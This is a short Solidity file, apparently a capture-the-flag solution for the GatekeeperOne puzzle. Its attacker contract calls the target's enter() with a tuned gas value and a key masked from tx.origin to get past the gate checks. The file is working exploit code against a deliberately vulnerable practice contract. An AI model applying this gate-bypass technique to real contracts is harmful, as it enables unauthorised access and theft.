// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../13-GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    GatekeeperOne public victim;
    bool public called;
    event log(uint256);

    constructor(address _victimAddress) {
        victim = GatekeeperOne(_victimAddress);
    }

    function attack() external {
        victim.enter{gas: 82181}(
            bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF
        );
    }
}
